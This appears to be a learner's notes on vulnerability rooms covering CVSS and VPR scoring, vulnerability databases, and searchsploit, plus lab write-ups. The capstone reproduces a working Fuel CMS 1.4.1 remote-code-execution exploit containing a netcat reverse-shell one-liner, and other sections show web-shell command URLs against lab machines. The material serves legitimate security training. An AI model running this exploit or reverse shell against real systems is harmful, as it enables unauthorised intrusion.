# Vulnerabilities 101
## Introduction to Vulnerabilities
* A vulnerability in cybersecurity is defined as a weakness or flaw in the design, implementation or behaviours of a system or application.
  * NIST defines a vulnerability as “weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source”.
* An attacker can exploit these weaknesses to gain access to unauthorised information or perform unauthorised actions.
* There are arguably five main categories of vulnerabilities.

| Vulnerability | Description
| --- | ---
| Operating System | These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
| (Mis)Configuration-based | These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
| Weak or Default Credentials | Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. 
| Application Logic | These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
| Human-Factor | Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate.

## Scoring Vulnerabilities (CVSS & VPR)
* Vulnerability management is the process of evaluating, categorising and ultimately remediating threats (vulnerabilities) faced by an organisation.
* Arguably impossible to patch and remedy every single vulnerability in a network or computer system and sometimes a waste of resources.
  * Only approximately 2% of vulnerabilities ever end up being exploited ([Kenna security., 2020](https://www.kennasecurity.com/resources/prioritization-to-prediction-report/)).
* Address the most dangerous vulnerabilities and reducing the likelihood of an attack vector being used to exploit a system.
* Vulnerability scoring is used to determine the potential risk and impact a vulnerability may have on a network or computer system.
  * Common Vulnerability Scoring System (CVSS) awards points to a vulnerability based upon its features, availability, and reproducibility.

## Common Vulnerability Scoring System (CVSS)
* Introduced in 2005.
* Very popular framework for vulnerability scoring and has three major iterations.
  * Current version is CVSSv3.1 (with version 4.0 currently in draft).
* Score is determined by a number of factors.
1. How easy is it to exploit the vulnerability?
2. Do exploits exist for this?
3. How does this vulnerability interfere with the CIA triad?
* So many variables that a [calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) is available to figure out the score using this framework.
* Vulnerabilities are given a classification (out of five) depending on the score that has been assigned.

| Rating | Score
| --- | ---
| None | 0
| Low | 0.1 - 3.9
| Medium | 4.0 - 6.9
| High | 7.0 - 8.9
| Critical | 9.0 - 10.0

| Advantages of CVSS | Disadvantages of CVSS
| --- | ---
| CVSS has been around for a long time. | CVSS was never designed to help prioritise vulnerabilities, instead, just assign a value of severity.
| CVSS is popular in organisations. | CVSS heavily assesses vulnerabilities on an exploit being available. However, only 20% of all vulnerabilities have an exploit available ([Tenable., 2020](https://www.tenable.com/research)) .
| CVSS is a free framework to adopt and recommended by organisations such as NIST. | Vulnerabilities rarely change scoring after assessment despite the fact that new developments such as exploits may be found.

## Vulnerability Priority Rating (VPR)
* More modern framework in vulnerability management developed by Tenable.
* Considered to be risk-driven.
  * Vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organisation itself instead of factors such as impact (like with CVSS).
  * VPR scoring takes into account the relevancy of a vulnerability.
    * No risk is considered regarding a vulnerability if that vulnerability does not apply to the organisation. 
* Dynamic in its scoring.
  * Risk that a vulnerability may pose can change almost daily as it ages.
* Uses a similar scoring range as CVSS.
  * VPR does not have a "None/Informational" category.
  * Same vulnerability will have a different score using VPR than when using CVSS as VPR uses a different scoring method.

| Rating | Score
|--- | ---
| Low | 0.0 - 3.9
| Medium | 4.0 - 6.9
| High | 7.0 - 8.9
| Critical | 9.0 - 10.0

| Advantages of VPR | Disadvantages of VPR
| --- | ---
| VPR is a modern framework that is real-world. | VPR is not open-source like some other vulnerability management frameworks.
| VPR considers over 150 factors when calculating risk. | VPR can only be adopted apart of a commercial platform.
| VPR is risk-driven and used by organisations to help prioritise patching vulnerabilities. | VPR does not consider the CIA triad to the extent that CVSS does; meaning that risk to the confidentiality, integrity and availability of data does not play a large factor in scoring vulnerabilities when using VPR.
| Scorings are not final and are very dynamic, meaning the priority a vulnerability should be given can change as the vulnerability ages.

## Vulnerability Databases
Throughout your journey in cybersecurity, you will often come across a magnitude of different applications and services. For example, a CMS whilst they all have the same purpose, often have very different designs and behaviours (and, in turn, potentially different vulnerabilities).
Thankfully for us, there are resources on the internet that keep track of vulnerabilities for all sorts of software, operating systems and more! This section will showcase two databases that we can use to look up existing vulnerabilities for applications discovered in our infosec journey, specifically the following websites:
1. NVD (National Vulnerability Database)
2. Exploit-DB
Before we dive into these two resources, let's ensure that our understanding of some fundamental key terms is on the same page:
Term
Definition
Vulnerability
A vulnerability is defined as a weakness or flaw in the design, implementation or behaviours of a system or application.
Exploit
An exploit is something such as an action or behaviour that utilises a vulnerability on a system or application.
Proof of Concept (PoC)
A PoC is a technique or tool that often demonstrates the exploitation of a vulnerability.

## NVD – National Vulnerability Database
The National Vulnerability Database is a website that lists all publically categorised vulnerabilities. In cybersecurity, vulnerabilities are classified under “Common Vulnerabilities and Exposures” (Or CVE for short).
These CVEs have the formatting of CVE-YEAR-IDNUMBER. For example, the vulnerability that the famous malware WannaCry used was CVE-2017-0144.
NVD allows you to see all the CVEs that have been confirmed, using filters by category and month of submission. For example, it is three days into August; there have already been 223 new CVEs submitted to this database.

While this website helps keep track of new vulnerabilities, it is not great when searching for vulnerabilities for a specific application or scenario.

## Exploit-DB
Exploit-DB is a resource that we, as hackers, will find much more helpful during an assessment. Exploit-DB retains exploits for software and applications stored under the name, author and version of the software or application.

We can use Exploit-DB to look for snippets of code (known as Proof of Concepts) that are used to exploit a specific vulnerability.

## An Example of Finding a Vulnerability
In this task, I’m going to demonstrate the process of finding one minor vulnerability, coupled with some research of the vulnerability databases leading to a much more valuable vulnerability and exploit ultimately.

Throughout an assessment, you will often combine multiple vulnerabilities to get results. For example, in this task, we will leverage the “Version Disclosure” vulnerability to find out the version of an application. With this version, we can then use Exploit-DB to search for any exploits that work with that specific version. 

Applications and software usually have a version number. This information is usually left with good intentions; for example, the author can support multiple versions of the software and the likes. Or sometimes, left unintentionally.

For example, in the screenshot below, we can see that the name and version number of this application is “Apache Tomcat 9.0.17”



With this information in hand, let’s use the search filter on Exploit-DB to look for any exploits that may apply to “Apache Tomcat 9.0.17”.


After searching Exploit-DB, there are a total of five exploits that may be useful to us for this specific version of the application. 

## Showcase: Exploiting Ackme's Application
It is your first week at ThePentestingCo as a Jr. Penetration tester. To ease into the role, you are shadowing a Sr. Penetration tester on your first engagement.
The Sr. Penetration tester has managed to find a vulnerability in a web application that the client (ACKme IT Services) uses.
Follow the steps that the Sr. Penetration tester took to ultimately exploit ACKme IT Service's infrastructure.

### 1. Information Gathering
At this stage, the Sr. Penetration Tester has used a public service that compiles some details about the target company.
As we can see, ACKme IT Services provide IT services to 800+ clients. This information is useful because we can begin to think of possible software that they are using for us to attack. For example, helpdesk or a support application.

### 2. Enumeration & Scanning
The Sr. Penetration tester now moves onto the enumeration and scanning stage of the engagement. This stage helps establish services and applications running on ACKme's infrastructure.
We can use the information gathered from this scan to begin to understand what services may be viable to attack. For example, a webserver hosting a website.
Recall from our Email, we are given one IP address 240.228.189.136. Try scanning this IP address yourself...

### 3. Application Testing
Using the information gathered from stage two of the penetration engagement. The Jr. Penetration tester has visited the target in their web browser and has been greeted with a login page.
The Sr. Penetration tester guesses some random passwords such as "admin" and "admin" to no avail. They notice a version number of the application 1.5.2 and take note of this. This will be useful for the next stage.

### 4. Vulnerability Research
The Sr. Penetration tester recalls that ACKme IT Services uses an application called "ACKme Portal" that has a version number of "1.5.2". The Sr. Penetration Tester visits a vulnerability & exploit database called "Vulnerability Bank™️".
This website stores details of vulnerabilities and exploits for applications. The Sr. Penetration Tester searches this site for the software that was discovered in stage three. They're in luck! There is one vulnerability listed for that application & version: Remote Code Execution (RCE).
RCE vulnerability allows commands to be executed on the target's system. The Sr. Penetration Tester could use this vulnerability to gain access to the console of the target.

### 5. Exploitation
Accumulating the information from all the previous stages, the Sr. Penetration Tester uses the exploit downloaded from Vulnerability Bank™️ against ACKme's web application on 240.228.189.13.
The exploit is successful and abuses the Remote Code Execution (RCE) vulnerability to launch a reverse shell on ACKme's infrastructure.
From here, the Sr. Penetration tester can look for files of value such as passwords, backups or application source code.

# Exploit Vulnerabilities
## Automated Vs. Manual Vulnerability Research
There are a myriad of tools and services available in cybersecurity for vulnerability scanning. Ranging from being commercial (and footing a heavy bill) to open-source and free, vulnerability scanners are convenient means of quickly canvassing an application for flaws.

For example, the vulnerability scanner Nessus has both a free (community) edition and commercial. The commercial version costing thousands of pounds for a year's licence will likely be used in organisations providing penetration testing services or audits.

Some of the advantages and disadvantages of using a vulnerability scanner are below:

Advantage
Disadvantage
Automated scans are easy to repeat, and the results can be shared within a team with ease.
People can often become reliant on these tools.
These scanners are quick and can test numerous applications efficiently.
They are extremely "loud" and produce a lot of traffic and logging. This is not good if you are trying to bypass firewalls and the likes.
Open-source solutions exist.
Open-source solutions are often basic and require expensive licences to have useful features.
Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for.
They often do not find every vulnerability on an application.


Frameworks such as Metasploit often have vulnerability scanners for some modules; this is something you will come onto learn about in a further module in this pathway.

Manual scanning for vulnerabilities is often the weapon of choice by a penetration tester when testing individual applications or programs. In fact, manual scanning will involve searching for the same vulnerabilities and uses similar techniques as automated scanning.

Ultimately, both techniques involve testing an application or program for vulnerabilities. These vulnerabilities include:

Vulnerability
Description
Security Misconfigurations
Security misconfigurations involve vulnerabilities that are due to developer oversight. For example, exposing server information in messages between the application and an attacker.
Broken Access Control
This vulnerability occurs when an attacker is able to access parts of an application that they are not supposed to be able to otherwise.
Insecure Deserialization
This is the insecure processing of data that is sent across an application. An attacker may be able to pass malicious code to the application, where it will then be executed.
Injection
An Injection vulnerability exists when an attacker is able to input malicious data into an application. This is due to the failure of not ensuring (known as sanitising) input is not harmful.


If you are keen to learn more about these vulnerabilities, the OWASP framework will be a useful read to you. 
## Finding Manual Exploits
### Rapid7
Much like other services such as Exploit DB and NVD, Rapid7 is a vulnerability research database. The only difference being that this database also acts as an exploit database. Using this service, you can filter by type of vulnerability (I.e. application and operating system).



Additionally, the database contains instructions for exploiting applications using the popular Metasploit tool. For example, this entry on Rapid7 is for “Wordpress Plugin SP Project & Document”, where we can see instructions on how to use an exploit module to abuse this vulnerability.

### GitHub
GitHub is a popular web service designed for software developers. The site is used to host and share the source code of applications to allow a collaborative effort. However, security researchers have taken to this platform because of the aforementioned reasons as well. Security researchers store & share PoC’s (Proof of Concept) on GitHub, turning it into an exploit database in this context.

GitHub is extremely useful in finding rare or fresh exploits because anyone can create an account and upload – there is no formal verification process like there is with alternative exploit databases. With that said, there is also a downside in that PoC’s may not work where little to no support will be provided.




GitHub uses a tagging and keyword system, meaning that we can search GitHub by keywords such as “PoC”, “vulnerability”, and many more. At the time of writing, there are 9,682 repositories with the keyword “cve”. We are also able to filter the results by programming language.

### Searchsploit
Searchsploit is a tool that is available on popular pentesting distributions such as Kali Linux. This tool is an offline copy of Exploit-DB, containing copies of exploits on your system. 

You are able to search searchsploit by application name and/or vulnerability type. For example, in the snippet below, we are searching searchsploit for exploits relating to Wordpress that we can use – no downloading necessary!

searchsploit wordpress
WordPress Theme Think Responsive 1.0 - Arbitr | php/webapps/29332.txt
WordPress Theme This Way - 'upload_settings_i | php/webapps/38820.php
WordPress Theme Toolbox - 'mls' SQL Injection | php/webapps/38077.txt
WordPress Theme Trending 0.1 - 'cpage' Cross- | php/webapps/36195.txt
WordPress Theme Uncode 1.3.1 - Arbitrary File | php/webapps/39895.php
WordPress Theme Urban City - 'download.php' A | php/webapps/39296.txt
WordPress Theme Web Minimalist 1.1 - 'index.p | php/webapps/36184.txt
WordPress Theme White-Label Framework 2.0.6 - | php/webapps/38105.txt
WordPress Theme Wp-ImageZoom - 'id' SQL Injec | php/webapps/38063.txt
WordPress Theme Zoner Real Estate - 4.1.1 Per | php/webapps/47436.txt

## Example of Manual Exploitation
We can use the information gathered from task 2 in this room to exploit the vulnerable service. Ultimately, one of the most effective vulnerabilities that we can exploit is the ability to execute commands on the target that is running the vulnerable application or service.
For example, being able to execute commands on the target that is running the vulnerable application or service will allow us to read files or execute commands that we previously wouldn’t be able to perform using the application or service alone. Additionally, we can abuse this to gain what is known as a foothold to the machine. A foothold is an access to the vulnerable machine’s console, where we can then begin to exploit other applications or machines on the network.

We are going to use an exploit to perform remote code execution on the application from task 2 to be able to remotely execute commands on the vulnerable machine.
Before we start, it is important to note that exploits rarely come out of the box and are ready to be used. They often require some configuration before they will work for our environment or target. The level of configuration will vary upon the exploit, so you will often find multiple exploits for the same vulnerability on an application. It is up to you to figure out which exploit is the most appropriate or useful to you.
For example, in the snippet below, we can see that a few options have been changed to reflect the IP address of the machine that we are attacking from.
nano exploit.py
mymachine="10.13.37.10"
port="1337"
Once we have configured the exploit correctly, let’s further read this exploit to understand how to use it. In the snippet below, we can see that we need to provide two arguments when running the exploit:
exploit.py --help
To use this exploit, provide the following arguments:
-u The URL of the application
-c the command that you wish to execute       
With this information in mind, we are now ready to use this exploit on the vulnerable machine. We are going to do the following:
Use the exploit to upload a malicious file to the vulnerable application containing whatever command we wish to execute, where the web server will run this malicious file to execute the code.
The file will first contain a basic command that we will use to verify that the exploit has worked.
exploit.py -u http://10.10.10.10 -c "whoami"
www-data    
Then we are going to read the contents of a file located on the vulnerable machine.
exploit.py -u http://10.10.10.10 -c "cat flag.txt"
THM{EXPLOIT_COMPLETE}

## Practical: Manual Exploitation
Visit the webserver running on the machine by navigating to http://10.10.46.162.

Find out the version of the application that is running. What is the name and version number of the application?



Now use the resources and skills from this module to find an exploit that will allow you to gain remote access to the vulnerable machine.

Used searchsploit to identify RCE vulnerability:

searchsploit -eo ”online book store 1.0”



Use this exploit against the vulnerable machine.  What is the value of the flag located in a web directory?

Ran exploit against URL to create web shell:

python3 Desktop/Additional\ Tools/searchsploit/exploits/php/webapps/47887.py http://10.10.46.162



	Tested web shell in the browser:

	http://10.10.46.162/bootstrap/img/GljxduJguc.php?cmd=whoami

	
	
	Listed directory contents:

	http://10.10.46.162/bootstrap/img/GljxduJguc.php?cmd=ls

	

Printed contents of flag.txt file:

	http://10.10.46.162/bootstrap/img/GljxduJguc.php?cmd=cat+flag.txt	

# Vulnerability Capstone
Ackme Support Incorporated has recently set up a new blog. Their developer team has asked for a security audit to be performed before they create and publish articles to the public. 
It is your task to perform a security audit on the blog; looking for and abusing any vulnerabilities that you find.
What is the name of the application running on the vulnerable machine?

What is the version number of this application?

What is the number of the CVE that allows an attacker to remotely execute code on this application?
Used Exploit Database to search for “remote code execution fuel cms 1.4”.  This produced 3 results.  Each referred to the same CVE: 
	CVE-2018-16763
Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability.
Note: There are numerous exploits out there that can be used for this vulnerability (some more useful than others!)
THM listed a compatible exploit as the question hint:

Contents of exploit file:
#!/usr/bin/python3

# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763
#
# Poc Created by Ac1d (assassin)

import requests
import sys
import urllib

from requests.sessions import extract_cookies_to_jar

class col:
	HEADER = '\033[95m'
	BLUE = '\033[94m'
	CYAN = '\033[96m'
	GREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	RESET = '\033[0m'
	BLACK = "\033[0;30m"
	RED = "\033[0;31m"
	GREEN = "\033[0;32m"
	BROWN = "\033[0;33m"
	BLUE = "\033[0;34m"
	PURPLE = "\033[0;35m"
	LIGHT_GRAY = "\033[0;37m"
	DARK_GRAY = "\033[1;30m"
	LIGHT_RED = "\033[1;31m"
	LIGHT_GREEN = "\033[1;32m"
	YELLOW = "\033[1;33m"
	LIGHT_BLUE = "\033[1;34m"
	LIGHT_PURPLE = "\033[1;35m"
	LIGHT_CYAN = "\033[1;36m"
	LIGHT_WHITE = "\033[1;37m"
	BOLD = "\033[1m"
	FAINT = "\033[2m"
	ITALIC = "\033[3m"
	UNDERLINE = "\033[4m"
	BLINK = "\033[5m"
	NEGATIVE = "\033[7m"
	CROSSED = "\033[9m"

def banner():
	banner = r"""
 ______     	_ _____ ___  ___ _____
|  ___|    	| /  __ \|  \/  |/  ___|
| |_ _   _  ___| | /  \/| .  . |\ `--.
|  _| | | |/ _ \ | |	| |\/| | `--. \
| | | |_| |  __/ | \__/\| |  | |/\__/ /
\_|  \__,_|\___|_|\____/\_|  |_/\____/
Tested on 1.4                                  	 
"""
	banner += "Created by Ac1d"
	return col.LIGHT_BLUE + banner + col.RESET

def help():
	banner = col.LIGHT_WHITE + "\n\tMenu\n"
	banner += col.LIGHT_GREEN
	banner += "\nexit 	-\tExit app"
	banner += "\nshell_me -\tGet a reverse shell (netcat) "
	banner += "\nhelp 	-\tShow this help\n"+ col.RESET
	return banner

print(banner())
print(help())

#http://10.10.12.27/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27ls%20-la%27)%2B%27

if len(sys.argv) != 2:
	print("\nUsage: python3 exploit.py Vulnerable IPADDRESS")
	sys.exit(0)

IP=sys.argv[1]

def parsePage(page):
	try:       	 
    	page = page.split("<h4>A PHP Error was encountered</h4>")[0]
    	page = page.split("<div")[0]
    	page = page[6:]
    	return page
	except:
    	return False

try:
   	 
	while True:
    	cmd = input(col.LIGHT_WHITE +"fuelCMS$ " + col.RESET)

    	if cmd[0:4].lower() == "exit":
        	print(col.RED + "Exiting..." + col.RESET)
        	sys.exit(0)

    	if cmd[0:8] == "shell_me":
        	IP2, PORT = input(col.LIGHT_BLUE + "Enter your attacking machine IP:PORT $ " + col.RESET).split(":")
        	nc = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP2} {PORT} >/tmp/f"
        	cmd = nc
        	print(col.LIGHT_GREEN + "\nHope you had your listener ready!!" + col.RESET)
       	 
    	if cmd[0:4] == "help":
        	print(help())
        	continue
   	 
    	if not "/tmp/f;mkfifo" in cmd:
        	print(col.LIGHT_GRAY + "Sending request." + col.RESET)
    	cmd = urllib.parse.quote(cmd)
    	r = requests.get(f"http://{IP}/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27"+ cmd +"%27)%2B%27")
    	if r.status_code == 200:
        	page = parsePage(r.text)
        	if page == "\n":
            	print(col.RED + "No result" + col.RESET)
            	continue
        	print(col.LIGHT_GREEN+ f"\n{page.strip()}" + col.RESET)

except Exception as e:
	print(col.RED + f"An error occurred, please try again...\n\n{e}" + col.RESET)

	Created listener to catch reverse shell:

	nc -nlvp 8081

	Execuled exploit against IP address:

python3 /usr/share/exploits/vulnerabilitiescapstone/exploit.py 10.10.69.70

Used ‘shell_me’ option to enter attacking machine IP and port:



	Reverse shell connected:

	
What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine.
Used ls to identify flag.txt in /home/ubuntu and opened txt file using cat to recover flag.

